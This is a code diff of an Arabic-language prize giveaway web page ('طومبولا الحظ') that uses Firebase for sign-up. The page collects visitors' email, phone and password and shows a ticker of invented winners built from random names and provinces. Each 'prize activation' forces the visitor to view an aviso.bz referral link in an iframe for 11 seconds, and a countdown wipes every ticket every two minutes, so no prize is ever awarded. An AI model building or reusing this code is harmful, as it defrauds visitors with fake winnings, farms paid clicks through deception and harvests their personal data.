@@ -18,19 +18,30 @@
         .ticket-inner::before, .ticket-inner::after { content: ''; position: absolute; width: 30px; height: 30px; background: #f8fafc; border-radius: 50%; top: 50%; transform: translateY(-50%); border: 2px solid var(--gold); }
         .ticket-inner::before { left: -20px; } .ticket-inner::after { right: -20px; }
         .countdown-timer { background: linear-gradient(90deg, #1e293b 0%, #334155 100%); color: white; border-radius: 15px; padding: 15px; margin-bottom: 25px; display: flex; align-items: center; justify-content: center; gap: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        .timer-unit { display: flex; flex-direction: column; align-items: center; }
         .timer-val { font-size: 24px; font-weight: 900; color: var(--gold); line-height: 1; }
         .timer-label { font-size: 10px; color: #94a3b8; font-weight: bold; }
         .prizes-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); gap: 20px; padding: 10px; }
-        .btn-activate { background: #fff; border: 3px dashed var(--gold); transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); width: 100%; aspect-ratio: 3/4; display: flex; flex-direction: column; align-items: center; justify-content: center; border-radius: 28px; cursor: pointer; padding: 10px; }
+        @media (min-width: 768px) { .prizes-grid { grid-template-columns: repeat(auto-fill, minmax(240px, 1fr)); gap: 30px; } }
+        .btn-activate { background: #fff; border: 3px dashed var(--gold); transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); width: 100%; aspect-ratio: 3/4; display: flex; flex-direction: column; align-items: center; justify-content: center; border-radius: 28px; cursor: pointer; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05); padding: 10px; }
         .btn-activate:hover { border-style: solid; background: #fffbeb; transform: translateY(-8px); box-shadow: 0 20px 25px -5px rgba(251, 191, 36, 0.3); }
         .prize-card { border-radius: 28px; overflow: hidden; background: white; width: 100%; aspect-ratio: 3/4; animation: fadeIn 0.5s ease-out; box-shadow: 0 15px 30px -10px rgba(180, 83, 9, 0.2); display: flex; flex-direction: column; border: 3px solid var(--gold); }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
         .prize-img { flex: 1; width: 100%; height: 60%; object-fit: contain; padding: 15px; background: white; }
         .prize-info { background: linear-gradient(to bottom, var(--gold), var(--gold-dark)); color: white; padding: 12px; text-align: center; flex-shrink: 0; }
+        #adFrameContainer { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; background: #fff; }
+        #adFrame { width: 100%; height: calc(100% - 60px); border: none; margin-top: 60px; }
+        .ad-header { position: absolute; top: 0; left: 0; width: 100%; height: 60px; background: #fff; display: flex; align-items: center; justify-content: center; border-bottom: 3px solid var(--gold); z-index: 10000; }
         #toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); padding: 14px 28px; border-radius: 16px; background: var(--primary); color: white; font-size: 14px; z-index: 200; display: none; box-shadow: 0 10px 15px -3px rgba(0,0,0,0.2); }
+        input { background: #f8fafc !important; border: 2px solid #e2e8f0 !important; color: #1e293b !important; }
+        input:focus { border-color: var(--gold) !important; }
         .ticker-container { width: 100%; background: #fffbeb; border: 2px solid var(--gold); overflow: hidden; white-space: nowrap; padding: 12px 0; margin-bottom: 15px; border-radius: 20px; position: relative; }
+        .ticker-container::before { content: "البث المباشر للفائزين"; position: absolute; right: 0; top: 0; bottom: 0; background: var(--gold); color: var(--primary); font-weight: 900; font-size: 10px; padding: 0 15px; display: flex; align-items: center; z-index: 10; box-shadow: -5px 0 15px rgba(0,0,0,0.1); }
         .ticker-wrapper { display: inline-block; animation: ticker 350s linear infinite; padding-right: 150px; }
         .ticker-item { display: inline-block; padding: 0 40px; font-size: 14px; color: var(--gold-dark); font-weight: bold; }
+        .ticker-item span { color: var(--primary); background: rgba(251, 191, 36, 0.1); padding: 2px 6px; border-radius: 4px; margin: 0 3px; }
         @keyframes ticker { 0% { transform: translateX(0); } 100% { transform: translateX(100%); } }
+        .active-tickets-list { display: flex; flex-wrap: wrap; gap: 10px; margin-top: 15px; }
         .ticket-badge { background: #fef3c7; border: 1px solid #fbbf24; color: #b45309; padding: 4px 12px; border-radius: 8px; font-size: 11px; font-weight: 800; animation: pulse 2s infinite; }
         @keyframes pulse { 0% { opacity: 0.8; } 50% { opacity: 1; transform: scale(1.05); } 100% { opacity: 0.8; } }
     </style>
@@ -39,16 +50,28 @@
     <div class="bg-animate"></div>
     <div id="toast"></div>
 
+    <div id="adFrameContainer">
+        <div class="ad-header">
+            <div class="flex items-center gap-4">
+                <span class="text-sm font-bold text-slate-600">جاري تفعيل الهدية...</span>
+                <div class="bg-amber-500 text-white px-4 py-1 rounded-full font-black text-xl shadow-md" id="frameTimer">11</div>
+            </div>
+        </div>
+        <iframe id="adFrame" src=""></iframe>
+    </div>
+
     <div id="loginPage" class="page active items-center justify-center p-4">
-        <div class="max-w-md w-full glass p-8 text-center">
-            <div class="w-20 h-20 bg-amber-100 rounded-full flex items-center justify-center text-4xl mx-auto mb-6 border-2 border-amber-400">🎁</div>
-            <h1 class="text-4xl font-black mb-2 text-amber-600">طومبولا الحظ</h1>
-            <p class="text-slate-500 mb-8 text-sm">سجل دخولك للمشاركة في السحب الذهبي</p>
-            <div class="space-y-4 text-right">
-                <input type="email" id="emailInput" placeholder="البريد الإلكتروني" class="w-full p-4 rounded-2xl border-2 border-slate-100 outline-none focus:border-amber-400 transition" dir="ltr">
-                <input type="tel" id="phoneInput" placeholder="رقم الهاتف (مثال: 06XXXXXXXX)" class="w-full p-4 rounded-2xl border-2 border-slate-100 outline-none focus:border-amber-400 transition" dir="ltr">
-                <input type="password" id="passwordInput" placeholder="كلمة المرور" class="w-full p-4 rounded-2xl border-2 border-slate-100 outline-none focus:border-amber-400 transition" dir="ltr">
-                <button id="authBtn" class="w-full bg-amber-500 hover:bg-amber-600 text-white font-black py-4 rounded-2xl mt-4 shadow-lg transition-all active:scale-95">دخول / تسجيل</button>
+        <div class="max-w-md w-full glass p-8">
+            <div class="flex justify-center mb-6">
+                <div class="w-20 h-20 bg-amber-100 rounded-full flex items-center justify-center text-4xl shadow-inner border-2 border-amber-400">🎁</div>
+            </div>
+            <h1 class="text-4xl font-black mb-2 text-center text-amber-600">طومبولا الحظ</h1>
+            <p class="text-slate-500 text-center mb-8 text-sm">سجل دخولك الآن لفرصة الفوز بجوائز قيمة</p>
+            <div class="space-y-4">
+                <input type="email" id="emailInput" placeholder="البريد الإلكتروني" class="w-full p-4 rounded-2xl outline-none text-left transition" dir="ltr">
+                <input type="tel" id="phoneInput" placeholder="رقم الهاتف" class="w-full p-4 rounded-2xl outline-none text-left transition" dir="ltr">
+                <input type="password" id="passwordInput" placeholder="كلمة المرور" class="w-full p-4 rounded-2xl outline-none text-left transition" dir="ltr">
+                <button id="authBtn" class="w-full bg-amber-500 hover:bg-amber-600 text-white font-black py-4 rounded-2xl mt-4 shadow-lg transition-all transform active:scale-95">دخول / تسجيل</button>
             </div>
         </div>
     </div>
@@ -59,34 +82,52 @@
                 <div class="ticket-inner">
                     <div class="flex-1">
                         <h2 class="text-xl md:text-2xl font-black text-slate-800">الجوائز الذهبية المتاحة</h2>
-                        <p id="userPhoneDisplay" class="text-amber-600 font-black text-sm mt-1">المشارك: --</p>
-                        <div id="activeTicketsContainer" class="flex flex-wrap gap-2 mt-3"></div>
+                        <div class="flex items-center gap-2 mt-1">
+                            <span class="w-2 h-2 bg-green-500 rounded-full animate-ping"></span>
+                            <p id="userPhoneDisplay" class="text-amber-600 font-black text-sm">المشارك المحظوظ: --</p>
+                        </div>
+                        <div id="activeTicketsContainer" class="active-tickets-list"></div>
                     </div>
-                    <div class="text-center px-4 border-r-2 border-dashed border-amber-200">
-                        <span class="text-[10px] font-bold text-slate-400 uppercase">ID</span>
-                        <div class="text-lg font-black text-amber-600" id="mainTicketID">#LUCKY</div>
+                    <div class="hidden md:block border-r-2 border-dashed border-amber-300 h-16 mx-6"></div>
+                    <div class="flex flex-col items-center justify-center">
+                        <span class="text-[10px] font-bold text-slate-400 uppercase tracking-widest">Ticket ID</span>
+                        <span class="text-lg font-black text-amber-600" id="mainTicketID">#LUCKY</span>
                     </div>
                 </div>
             </div>
 
-            <div class="ticker-container shadow-md"><div class="ticker-wrapper" id="tickerWrapper"></div></div>
+            <div class="ticker-container shadow-md">
+                <div class="ticker-wrapper" id="tickerWrapper"></div>
+            </div>
 
             <div class="countdown-timer">
-                <span class="text-xs font-black text-amber-400">سحب جديد خلال:</span>
+                <div class="flex items-center gap-3 ml-4">
+                    <span class="text-xs font-black uppercase text-amber-400">سحب جديد خلال:</span>
+                </div>
                 <div class="flex gap-4">
-                    <div class="timer-unit text-center"><span class="timer-val" id="mn">02</span><br><span class="timer-label">دقيقة</span></div>
-                    <div class="timer-unit text-center"><span class="timer-val" id="sc">00</span><br><span class="timer-label">ثانية</span></div>
+                    <div class="timer-unit">
+                        <span class="timer-val" id="mn">02</span>
+                        <span class="timer-label">دقيقة</span>
+                    </div>
+                    <div class="timer-unit">
+                        <span class="timer-val" id="sc">00</span>
+                        <span class="timer-label">ثانية</span>
+                    </div>
                 </div>
             </div>
             
             <div class="prizes-grid" id="prizesGrid"></div>
+
+            <div class="text-center mt-16 text-slate-400 text-xs font-medium">
+                جميع الحقوق محفوظة &copy; طومبولا الحظ الذهبية 2024
+            </div>
         </div>
     </div>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-app.js";
-        import { getFirestore, doc, onSnapshot, setDoc, getDoc, serverTimestamp, writeBatch } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-firestore.js";
-        import { getAuth, onAuthStateChanged, signInWithEmailAndPassword, createUserWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-auth.js";
+        import { getFirestore, doc, onSnapshot, setDoc, getDoc, serverTimestamp, addDoc, collection, updateDoc, writeBatch } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-firestore.js";
+        import { getAuth, onAuthStateChanged, signInWithEmailAndPassword, createUserWithEmailAndPassword, signOut } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-auth.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyCYipCdnHZXCkO3qKN9AqaWM9IDf9rOv04",
@@ -103,94 +144,217 @@
         const appId = "tombola-luck-v1";
 
         const prizeData = {
-            1: { name: "Samsung Galaxy A24", img: "https://github.com/danibakou-prog/PAYRIXW/blob/main/%D9%87%D8%A7%D8%AA%D9%81-Samsung-Galaxy-A24.jpg?raw=true" },
-            2: { name: "Smart Watch Pro", img: "https://github.com/danibakou-prog/PAYRIXW/blob/main/aac8ea81-cdea-499f-8668-21507e131368.jpg?raw=true" },
-            3: { name: "Airpods Pro 2", img: "https://github.com/danibakou-prog/PAYRIXW/blob/main/ca9ed7f7-e22c-407a-933c-b351bb8bf665.jpg?raw=true" },
-            4: { name: "PlayStation 5 Slim", img: "https://github.com/danibakou-prog/PAYRIXW/blob/main/d64385f1-7120-42b5-8d23-06b38b980b24.jpg?raw=true" },
-            5: { name: "Gaming Mouse RGB", img: "https://github.com/danibakou-prog/PAYRIXW/blob/main/b3fbe8f8-09ee-4669-9bef-cc051f9a68da.jpg?raw=true" },
-            6: { name: "Condor Refrigerator", img: "https://github.com/danibakou-prog/PAYRIXW/blob/main/60441268-4fe8-4751-b6eb-66bea972ea97.jpg?raw=true" },
-            7: { name: "Laptop Sleeve", img: "https://github.com/danibakou-prog/PAYRIXW/blob/main/656c9ef8-d45e-4cd8-a745-54a34faa6be4.jpg?raw=true" },
-            8: { name: "Amazon Gift Card $50", img: "https://github.com/danibakou-prog/PAYRIXW/blob/main/99a3c8f6-f38f-4b43-9970-adfa06c9533d.jpg?raw=true" },
-            9: { name: "iPhone 15 Pro", img: "https://github.com/danibakou-prog/PAYRIXW/blob/main/5310e3d5-4f07-4495-8221-a60aee958a66.jpg?raw=true" },
-            10: { name: "iPad Air M2", img: "https://m.media-amazon.com/images/I/61T0pX9O67L._AC_SL1500_.jpg" }
+            1: { name: "Samsung Galaxy A24", img: "https://github.com/danibakou-prog/PAYRIXW/blob/main/%D9%87%D8%A7%D8%AA%D9%81-Samsung-Galaxy-A24.jpg?raw=true", url: "https://aviso.bz/?r=id_2812" },
+            2: { name: "Smart Watch Pro", img: "https://github.com/danibakou-prog/PAYRIXW/blob/main/aac8ea81-cdea-499f-8668-21507e131368.jpg?raw=true", url: "https://aviso.bz/?r=id_2812" },
+            3: { name: "Airpods Pro 2", img: "https://github.com/danibakou-prog/PAYRIXW/blob/main/ca9ed7f7-e22c-407a-933c-b351bb8bf665.jpg?raw=true", url: "https://aviso.bz/?r=id_2812" },
+            4: { name: "PlayStation 5 Slim", img: "https://github.com/danibakou-prog/PAYRIXW/blob/main/d64385f1-7120-42b5-8d23-06b38b980b24.jpg?raw=true", url: "https://aviso.bz/?r=id_2812" },
+            5: { name: "Gaming Mouse RGB", img: "https://github.com/danibakou-prog/PAYRIXW/blob/main/b3fbe8f8-09ee-4669-9bef-cc051f9a68da.jpg?raw=true", url: "https://aviso.bz/?r=id_2812" },
+            6: { name: "Condor Refrigerator", img: "https://github.com/danibakou-prog/PAYRIXW/blob/main/60441268-4fe8-4751-b6eb-66bea972ea97.jpg?raw=true", url: "https://aviso.bz/?r=id_2812" },
+            7: { name: "Laptop Sleeve", img: "https://github.com/danibakou-prog/PAYRIXW/blob/main/656c9ef8-d45e-4cd8-a745-54a34faa6be4.jpg?raw=true", url: "https://aviso.bz/?r=id_2812" },
+            8: { name: "Amazon Gift Card $50", img: "https://github.com/danibakou-prog/PAYRIXW/blob/main/99a3c8f6-f38f-4b43-9970-adfa06c9533d.jpg?raw=true", url: "https://aviso.bz/?r=id_2812" },
+            9: { name: "iPhone 15 Pro", img: "https://github.com/danibakou-prog/PAYRIXW/blob/main/5310e3d5-4f07-4495-8221-a60aee958a66.jpg?raw=true", url: "https://aviso.bz/?r=id_2812" },
+            10: { name: "iPad Air M2", img: "https://m.media-amazon.com/images/I/61T0pX9O67L._AC_SL1500_.jpg", url: "https://aviso.bz/?r=id_2812" }
         };
 
-        // --- التوجيه لصفحة التحقق ---
-        window.startActivation = (uid, index) => {
-            const prize = prizeData[index];
-            window.location.href = `verify.html?uid=${uid}&index=${index}&prizeName=${encodeURIComponent(prize.name)}`;
-        };
+        const names = ["أحمد", "ياسين", "سارة", "محمد", "مريم", "حمزة", "ليلى", "كريم", "خديجة", "نور الدين", "إسماعيل", "فاطمة"];
+        const lastNames = ["بن علي", "بلقاسم", "منصوري", "حداد", "زروقي", "براهيمي", "سليماني", "طاهري", "عثماني", "مباركي"];
+        const states = ["الجزائر", "وهران", "قسنطينة", "سطيف", "عنابة", "تلمسان", "ورقلة", "بجاية", "تبسة", "الشلف", "تمنراست", "بسكرة"];
 
-        // إدارة الحالة والصفحات
+        function initTicker() {
+            const wrapper = document.getElementById('tickerWrapper');
+            let tickerHTML = '';
+            for(let i=0; i<20; i++) {
+                const name = names[Math.floor(Math.random() * names.length)];
+                const lName = lastNames[Math.floor(Math.random() * lastNames.length)];
+                const state = states[Math.floor(Math.random() * states.length)];
+                const prize = prizeData[Math.floor(Math.random() * 10) + 1].name;
+                const ticket = `GOLD-${Math.floor(10000 + Math.random() * 90000)}`;
+                tickerHTML += `
+                    <div class="ticker-item">
+                        🎊 فاز <span>${name} ${lName}</span> من ولاية <span>${state}</span> بـ <span>${prize}</span> | رقم التذكرة: <span>${ticket}</span>
+                    </div>
+                `;
+            }
+            wrapper.innerHTML = tickerHTML + tickerHTML;
+        }
+
+        async function resetAllCards(uid) {
+            try {
+                const batch = writeBatch(db);
+                for (let i = 1; i <= 10; i++) {
+                    const cardRef = doc(db, 'artifacts', appId, 'users', uid, 'activatedCards', `card_${i}`);
+                    batch.set(cardRef, { active: false, ticketNumber: null }, { merge: true });
+                }
+                await batch.commit();
+                showMessage("تم إجراء السحب! انتهت صلاحية التذاكر، فعل جوائز جديدة الآن.");
+                activeTicketsMap = {};
+                updateActiveTicketsDisplay();
+            } catch (e) { console.error("Error resetting cards:", e); }
+        }
+
+        function startDrawCountdown(uid) {
+            let totalSeconds = 120;
+            function updateTimer() {
+                const minutes = Math.floor(totalSeconds / 60);
+                const seconds = totalSeconds % 60;
+                document.getElementById('mn').innerText = minutes.toString().padStart(2, '0');
+                document.getElementById('sc').innerText = seconds.toString().padStart(2, '0');
+                if (totalSeconds <= 0) { totalSeconds = 120; resetAllCards(uid); } else { totalSeconds--; }
+            }
+            setInterval(updateTimer, 1000);
+            updateTimer();
+        }
+
+        function showPage(id) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
+            const target = document.getElementById(id);
+            if(target) {
+                target.style.display = (id === 'loginPage') ? 'flex' : 'block';
+                setTimeout(() => target.classList.add('active'), 10);
+            }
+        }
+
+        function showMessage(msg) {
+            const t = document.getElementById('toast');
+            t.innerText = msg; t.style.display = 'block';
+            setTimeout(() => t.style.display = 'none', 4000);
+        }
+
+        let activeTicketsMap = {};
+
+        function updateActiveTicketsDisplay() {
+            const container = document.getElementById('activeTicketsContainer');
+            container.innerHTML = '';
+            Object.keys(activeTicketsMap).forEach(id => {
+                const ticket = activeTicketsMap[id];
+                if(ticket && ticket.active) {
+                    const badge = document.createElement('div');
+                    badge.className = 'ticket-badge';
+                    badge.innerText = `نشط: ${ticket.num}`;
+                    container.appendChild(badge);
+                }
+            });
+        }
+
         onAuthStateChanged(auth, async (user) => {
             if (user) {
                 const snap = await getDoc(doc(db, 'artifacts', appId, 'users', user.uid, 'profile', 'info'));
-                let phone = localStorage.getItem('user_phone') || "Unknown";
+                let phone = localStorage.getItem('user_phone') || "غير معروف";
                 if (snap.exists()) phone = snap.data().phone;
                 document.getElementById('userPhoneDisplay').innerText = "المشارك المحظوظ: " + phone;
                 document.getElementById('mainTicketID').innerText = "#" + phone.slice(-5);
                 showPage('dashboardPage');
+                initTicker();
                 renderGrid(user.uid);
                 startDrawCountdown(user.uid);
-            } else {
-                showPage('loginPage');
-            }
+            } else { showPage('loginPage'); }
         });
 
         document.getElementById('authBtn').onclick = async () => {
             const email = document.getElementById('emailInput').value.trim();
-            const pass = document.getElementById('passwordInput').value.trim();
+            const password = document.getElementById('passwordInput').value.trim();
             const phone = document.getElementById('phoneInput').value.trim();
-            if(!email || !pass || !phone) return showMessage("أكمل البيانات أولاً");
+            if(!email || !password || !phone) { showMessage("يرجى إكمال كافة البيانات للمشاركة"); return; }
             try { 
-                await signInWithEmailAndPassword(auth, email, pass);
+                await signInWithEmailAndPassword(auth, email, password);
                 localStorage.setItem('user_phone', phone);
-            } catch {
-                try {
-                    const res = await createUserWithEmailAndPassword(auth, email, pass);
-                    await setDoc(doc(db, 'artifacts', appId, 'users', res.user.uid, 'profile', 'info'), { phone, email, createdAt: serverTimestamp() });
-                    localStorage.setItem('user_phone', phone);
-                } catch (e) { showMessage("خطأ: " + e.message); }
+            } catch (err) { 
+                if (err.code === 'auth/user-not-found' || err.code === 'auth/invalid-credential' || err.code === 'auth/invalid-email') {
+                    try {
+                        const res = await createUserWithEmailAndPassword(auth, email, password);
+                        await setDoc(doc(db, 'artifacts', appId, 'users', res.user.uid, 'profile', 'info'), {
+                            phone: phone, email: email, createdAt: serverTimestamp()
+                        });
+                        localStorage.setItem('user_phone', phone);
+                    } catch(e) { showMessage("خطأ في إنشاء الحساب: " + e.message); }
+                } else { showMessage("خطأ في الدخول: " + err.message); }
             }
         };
 
         function renderGrid(uid) {
             const grid = document.getElementById('prizesGrid');
             grid.innerHTML = '';
-            for(let i=1; i<=10; i++){
-                const cont = document.createElement('div');
-                cont.id = `prize-container-${i}`;
-                grid.appendChild(cont);
+            for(let i=1; i<=10; i++) {
+                const container = document.createElement('div');
+                container.id = `prize-container-${i}`;
+                grid.appendChild(container);
+
                 onSnapshot(doc(db, 'artifacts', appId, 'users', uid, 'activatedCards', `card_${i}`), (snap) => {
-                    const active = snap.exists() && snap.data().active;
+                    const data = snap.data();
+                    const active = snap.exists() && data.active;
                     const prize = prizeData[i];
-                    if(active){
-                        cont.innerHTML = `<div class="prize-card"><img src="${prize.img}" class="prize-img"><div class="prize-info"><h4 class="font-bold text-[12px] mb-1">${prize.name}</h4><div class="bg-white/20 py-1 rounded-lg font-mono text-[10px]">${snap.data().ticketNumber}</div><p class="text-[9px] mt-2 font-bold">تذكرة نشطة ✅</p></div></div>`;
+                    
+                    if(active) {
+                        const ticketNum = data.ticketNumber;
+                        activeTicketsMap[i] = { active: true, num: ticketNum };
+                        updateActiveTicketsDisplay();
+                        container.innerHTML = `
+                            <div class="prize-card">
+                                <img src="${prize.img}" class="prize-img" alt="${prize.name}">
+                                <div class="prize-info">
+                                    <h4 class="font-bold text-[12px] mb-1 truncate">${prize.name}</h4>
+                                    <div class="bg-white/20 py-1 rounded-lg"><p class="text-[10px] font-mono tracking-wider">${ticketNum}</p></div>
+                                    <p class="text-[9px] mt-2 font-bold">تذكرة فوز مفعلة ✅</p>
+                                </div>
+                            </div>
+                        `;
                     } else {
-                        cont.innerHTML = `<div class="btn-activate" onclick="startActivation('${uid}', ${i})"><div class="bg-amber-50 w-20 h-20 rounded-full flex items-center justify-center mb-2"><img src="${prize.img}" class="w-14 h-14 object-contain"></div><span class="font-black text-[12px] text-center">${prize.name}</span><span class="text-[10px] text-amber-600 font-bold mt-1">تفعيل الآن</span></div>`;
+                        delete activeTicketsMap[i];
+                        updateActiveTicketsDisplay();
+                        container.innerHTML = `
+                            <div class="btn-activate group" onclick="window.startActivation('${uid}', ${i})">
+                                <div class="bg-amber-50 w-24 h-24 rounded-full flex items-center justify-center mb-2 group-hover:scale-110 group-hover:bg-amber-100 transition-all duration-300 overflow-hidden">
+                                    <img src="${prize.img}" class="w-20 h-20 object-contain mb-2 opacity-90">
+                                </div>
+                                <span class="font-black text-[12px] text-slate-800 text-center">تفعيل ${prize.name}</span>
+                            </div>
+                        `;
                     }
                 });
             }
         }
 
-        function startDrawCountdown(uid) {
-            let sec = 120;
-            setInterval(() => {
-                sec--;
-                if(sec <= 0) { sec = 120; resetCards(uid); }
-                document.getElementById('mn').innerText = Math.floor(sec/60).toString().padStart(2,'0');
-                document.getElementById('sc').innerText = (sec%60).toString().padStart(2,'0');
+        window.startActivation = async function(uid, index) {
+            const prize = prizeData[index];
+            const phone = localStorage.getItem('user_phone') || "Unknown";
+
+            if (index === 4 || index === 5) {
+                const verifyUrl = `verify.html?uid=${uid}&index=${index}&phone=${phone}&prize=${encodeURIComponent(prize.name)}`;
+                window.open(verifyUrl, '_blank');
+                showMessage("اكمل التحقق في التبويب الجديد");
+                return;
+            }
+
+            const container = document.getElementById('adFrameContainer');
+            const frame = document.getElementById('adFrame');
+            const timerEl = document.getElementById('frameTimer');
+            container.style.display = 'block';
+            frame.src = prize.url;
+
+            let time = 11;
+            timerEl.innerText = time;
+            const interval = setInterval(async () => {
+                time--; timerEl.innerText = time;
+                if(time <= 0) {
+                    clearInterval(interval);
+                    await finalizeActivation(uid, index, phone, prize.name);
+                    container.style.display = 'none';
+                }
             }, 1000);
         }
 
-        async function resetCards(uid) {
-            const batch = writeBatch(db);
-            for(let i=1; i<=10; i++) batch.set(doc(db, 'artifacts', appId, 'users', uid, 'activatedCards', `card_${i}`), { active: false }, { merge: true });
-            await batch.commit();
+        async function finalizeActivation(uid, index, phone, prizeName) {
+            const ticketNum = `GOLD-${Math.floor(10000 + Math.random() * 90000)}`;
+            try {
+                const cardRef = doc(db, 'artifacts', appId, 'users', uid, 'activatedCards', `card_${index}`);
+                await setDoc(cardRef, { active: true, phone: phone, ticketNumber: ticketNum, timestamp: serverTimestamp() }, { merge: true });
+                await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'all_activations'), {
+                    userId: uid, phone: phone, prizeName: prizeName, ticketNumber: ticketNum, activatedAt: serverTimestamp()
+                });
+                showMessage(`مبروك! تم تفعيل بطاقة ${prizeName}`);
+            } catch (e) { showMessage("خطأ تقني."); }
         }
-
-        function showPage(id) { document.querySelectorAll('.page').forEach(p => p.classList.remove('active')); document.getElementById(id).classList.add('active'); document.getElementById(id).style.display = (id==='loginPage'?'flex':'block'); }
-        function showMessage(m) { const t = document.getElementById('toast'); t.innerText = m; t.style.display = 'block'; setTimeout(()=>t.style.display='none', 3000); }
     </script>
 </body>
 </html>
